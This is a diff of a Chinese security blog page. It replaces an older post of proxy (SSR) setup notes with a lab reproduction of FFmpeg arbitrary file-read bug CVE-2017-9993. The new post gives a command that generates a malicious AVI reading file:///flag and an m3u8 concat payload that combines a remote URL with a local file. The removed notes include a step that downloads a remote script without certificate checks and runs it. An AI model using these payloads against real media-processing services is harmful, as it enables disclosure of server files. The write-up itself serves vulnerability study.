@@ -5,11 +5,14 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="W4nde3&#39;s Secret">
+    <meta name="keywords" content="FFmpeg 文件读取漏洞(CVE-2017-9993), W4nde3&#39;s Secret">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="SSR备忘部署yum -y install wget
-wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/main/ssr.sh &amp;amp;&amp;">
+    <meta name="description" content="复现
+搭建好环境，访问http://118.202.10.43:8000/
+
+选用一个avi文件，使用此脚本生成可利用漏洞的恶意文件
+ python3 gen_xbin_avi.py file:///flag out_filename.av">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +20,7 @@ wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/mai
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>W4nde3&#39;s Secret</title>
+    <title>FFmpeg 文件读取漏洞(CVE-2017-9993) | W4nde3&#39;s Secret</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -489,7 +492,7 @@ wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/mai
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        
+                        FFmpeg 文件读取漏洞(CVE-2017-9993)
                     </div>
                 </div>
             </div>
@@ -611,7 +614,7 @@ wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/mai
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-02
+                    2020-12-08
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -625,7 +628,7 @@ wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/mai
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        187
+                        426
                     </div>
                     
 
@@ -649,20 +652,30 @@ wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/mai
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="SSR备忘"><a href="#SSR备忘" class="headerlink" title="SSR备忘"></a>SSR备忘</h2><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><pre><code>yum -y install wget
-wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/main/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</code></pre><h2 id="加速-谷歌BBR加速"><a href="#加速-谷歌BBR加速" class="headerlink" title="加速(谷歌BBR加速)"></a>加速(谷歌BBR加速)</h2><pre><code>yum -y install wget
-wget –no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh
-chmod +x bbr.sh
-./bbr.sh</code></pre><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul>
-<li><p>Windows SSR客户端 <a href="https://github.com/shadowsocksr-backup/shadowsocksr-csharp/releases" target="_blank" rel="noopener">下载地址</a> <a href="https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z" target="_blank" rel="noopener">备用下载地址</a></p>
+                <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol>
+<li><p>搭建好环境，访问<a href="http://118.202.10.43:8000/" target="_blank" rel="noopener">http://118.202.10.43:8000/</a></p>
 </li>
-<li><p>MAC SSR客户端 <a href="https://github.com/shadowsocksr-backup/ShadowsocksX-NG/releases" target="_blank" rel="noopener">下载地址</a> <a href="https://nofile.io/f/jgMWFwCBonU#ab0d3c3b6ac54482" target="_blank" rel="noopener">备用下载地址</a></p>
+<li><p>选用一个avi文件，使用此<a href="https://raw.githubusercontent.com/neex/ffmpeg-avi-m3u-xbin/master/gen_xbin_avi.py" target="_blank" rel="noopener">脚本</a>生成可利用漏洞的恶意文件</p>
+<p> python3 gen_xbin_avi.py file:///flag out_filename.avi</p>
 </li>
-<li><p>Linux客户端一键安装配置 <a href="https://github.com/the0demiurge/CharlesScripts/blob/master/charles/bin/ssr" target="_blank" rel="noopener">使用脚本</a><br>  图形界面的<a href="https://github.com/erguotou520/electron-ssr/releases" target="_blank" rel="noopener">linux ssr客户端</a></p>
+<li><p>上传恶意文件播放，即可看到读取的文件内容</p>
 </li>
-<li><p>安卓 SSR客户端 <a href="https://github.com/shadowsocksr-backup/shadowsocksr-android/releases" target="_blank" rel="noopener">下载地址</a> <a href="https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk" target="_blank" rel="noopener">备用下载地址</a></p>
-</li>
-</ul>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/c424e71538bf041b.png" alt=""></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ffmpeg是一个强大的多媒体框架，几乎支持所有格式的多媒体文件的转码、编解码。漏洞产生于ffmpeg对HLS格式的支持。<br>HLS是Apple的动态码率自适应技术，包含一个m3u8索引文件、TS媒体分片文件和key加密串文件。m3u8文件类似于一个配置文件，存放着所有TS媒体分片文件的资源地址和顺序等信息，通常情况下会先将TS资源缓存到本地然后逐片播放，但m3u8也支持远程的视频资源。</p>
+<pre><code>#EXTM3U
+#EXT-X-MEDIA-SEQUENCE
+#EXT-X-TARGETDURATION
+#EXT-X-ALLOW-CACHE
+#EXT-X-ENDLIST
+#EXTINF
+// redrain.ts        真正播放的视频资源
+http://www.redrain.sb/test.mp4 远程资源</code></pre><p>CVE-2016-1897中的SSRF就是利用m3u8可访问远程资源的特性，利用<code>|</code>将多个url资源合并并访问</p>
+<pre><code>#EXTM3U
+#EXT-X-TARGETDURATION:6
+#EXTINF:10.0,
+concat:http://rr.sb/poc/header.m3u8|file:///tmp/vuln
+#EXT-X-ENDLIST</code></pre><p>CVE-2017-9993实际是针对ffmpeg对SSRF漏洞封堵的bypass，AVI视频中有个一GAB2数据块用于定义字幕，而m3u8文件可以插入到avi文件中，且ffmpeg仍会对有<code>#EXYM3U</code>文件头的AVI文件做HLS处理，因此能够继续利用CVE-2016-1897漏洞</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -707,7 +720,7 @@ chmod +x bbr.sh
                     </span>
                     <a href="https://blog.iwonder.run" class="b-link-green">W4nde3's Secret</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/12/02/ss-ssr-notes/" class="b-link-green"></a>
+                    <a href="/2020/12/08/ffmpeg-3.x.x-wen-jian-du-qu-lou-dong/" class="b-link-green">FFmpeg 文件读取漏洞(CVE-2017-9993)</a>
                 </p>
             </div>
 
@@ -729,9 +742,10 @@ chmod +x bbr.sh
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/12/08/ffmpeg-3.x.x-wen-jian-du-qu-lou-dong/">
                     <div class="card-image">
@@ -753,14 +767,15 @@ chmod +x bbr.sh
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-08
+                            </span>
                         <span class="publish-author">
                             
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -771,7 +786,7 @@ chmod +x bbr.sh
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/02/host-discovery/">
+                <a href="/2020/12/02/ss-ssr-notes/">
                     <div class="card-image">
                         
                         
@@ -783,9 +798,8 @@ chmod +x bbr.sh
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            主机发现UDPnmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500
-msf &gt; use auxiliary/scanner/discovery/udp_probe
-msf &gt;
+                            SSR备忘部署yum -y install wget
+wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/main/ssr.sh &amp;&
                         
                     </div>
                     <div class="publish-info">
